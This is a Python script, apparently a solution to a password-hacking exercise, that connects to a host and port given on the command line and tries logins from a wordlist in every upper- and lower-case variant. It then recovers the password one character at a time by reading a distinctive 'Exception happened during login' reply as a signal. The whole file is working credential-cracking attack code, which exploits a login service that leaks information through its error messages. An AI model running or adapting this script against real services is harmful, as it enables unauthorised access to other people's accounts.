import json
import itertools
import os
import socket
import string
import sys


def json_form(login, password):
    attempt = {
        "login": login,
        "password": password
    }
    json_attempt = json.dumps(attempt)
    return json_attempt


def request_sender(hack_socket, login, password):
    json_request = json_form(login, password)
    byte_request = json_request.encode()
    return hack_socket.send(byte_request)


def reply_receptor(hack_socket):
    byte_result = hack_socket.recv(1024)
    result = byte_result.decode()
    return json.loads(result)


def json_reply_checker(rep):
    if rep == {
        "result": "Wrong password!"
    }:
        return 'wrong password'
    if rep == {
    "result": "Exception happened during login"
    }:
        return 'right char'
    if rep == {
    "result": "Connection success!"
    }:
        return 'success'


def file_path():
    absolute_path = os.path.dirname(os.path.abspath(__file__))
    path = absolute_path + '\\logins.txt'
    return path


def file_reader(file_name):
    with open(file_name, "r") as file:
        for row in file:
            yield row.rstrip()


def up_low_combinator(x):
    for var in map(''.join, itertools.product(*zip(x.upper(), x.lower()))):
        yield var


def login_crack(hack_socket):
    for raw_login in file_reader(file_path()):
        for login in up_low_combinator(raw_login):
            request_sender(hack_socket, login, ' ')
            json_result = reply_receptor(hack_socket)
            if json_reply_checker(json_result) == 'wrong password':
                return login


def char_generator():
    x = 0
    words = string.digits + string.ascii_letters
    while x < len(words):
        y = yield words[x]
        if y == "restart":
            x = 0
            continue
        x += 1


def first_letter_crack(hack_socket, login):
    gen = char_generator()
    while True:
        letter = next(gen)
        request_sender(hack_socket, login, letter)
        json_result = reply_receptor(hack_socket)
        if json_reply_checker(json_result) == 'right char':
            gen.send("restart")
            return letter


def password_crack(hack_socket, login, first_char):
    gen = char_generator()
    password = first_char
    counter = 0
    while True:
        letter = next(gen)
        request_sender(hack_socket, login, password + letter)
        json_result = reply_receptor(hack_socket)
        if json_reply_checker(json_result) == 'right char':
            password += letter
            gen.send("restart")
        counter += 1
        if json_reply_checker(json_result) == 'success':
            return password + letter


def main():
    hack_socket = socket.socket()
    host = str(sys.argv[1])
    port = int(sys.argv[2])
    hack_socket.connect((host, port))

    login = login_crack(hack_socket)
    first_char = first_letter_crack(hack_socket, login)
    password = password_crack(hack_socket, login, first_char)
    print(json_form(login, password))

    hack_socket.close()


if __name__ == "__main__":
    main()
